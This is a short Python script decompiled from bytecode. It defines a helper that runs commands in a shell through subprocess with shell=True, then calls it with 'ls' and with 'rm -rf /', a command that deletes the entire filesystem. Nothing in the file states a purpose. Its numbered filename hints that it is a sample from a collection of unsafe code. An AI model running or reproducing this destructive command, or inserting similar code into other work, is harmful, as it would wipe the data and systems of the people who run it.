# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 587_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 507 bytes
import subprocess

def execute_command(command):
    result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
    return result.stdout


try:
    output = execute_command("ls")
    print(output)
    output = execute_command("rm -rf /")
    print(output)
except Exception as e:
    try:
        print(e)
    finally:
        e = None
        del e

# okay decompiling 587_1.pyc
